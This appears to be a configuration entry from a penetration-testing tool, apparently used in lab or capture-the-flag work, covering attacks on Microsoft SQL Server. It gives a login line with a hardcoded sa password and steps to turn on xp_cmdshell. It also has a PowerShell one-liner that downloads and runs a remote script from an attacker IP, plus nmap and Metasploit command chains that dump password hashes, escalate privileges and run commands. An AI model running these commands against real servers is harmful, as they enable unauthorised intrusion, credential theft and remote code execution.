Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for MSSQL
  Note: |
    Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

    #sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

    ###the goal is to get xp_cmdshell working###
    1. try and see if it works
        xp_cmdshell `whoami`
        go

    2. try to turn component back on
        EXEC SP_CONFIGURE 'xp_cmdshell' , 1
        reconfigure
        go
        xp_cmdshell `whoami`
        go

    3. 'advanced' turn it back on
        EXEC SP_CONFIGURE 'show advanced options', 1
        reconfigure
        go
        EXEC SP_CONFIGURE 'xp_cmdshell' , 1
        reconfigure
        go
        xp_cmdshell 'whoami'
        go




    xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


    https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
  Name: Nmap for SQL
  Description: Nmap with SQL Scripts
  Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
  
Entry_3:
  	Name: MSSQL consolesless mfs enumeration
  	Description: MSSQL enumeration without the need to run msfconsole
  	Note: sourced from https://github.com/carlospolop/legion
  	Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' 
    



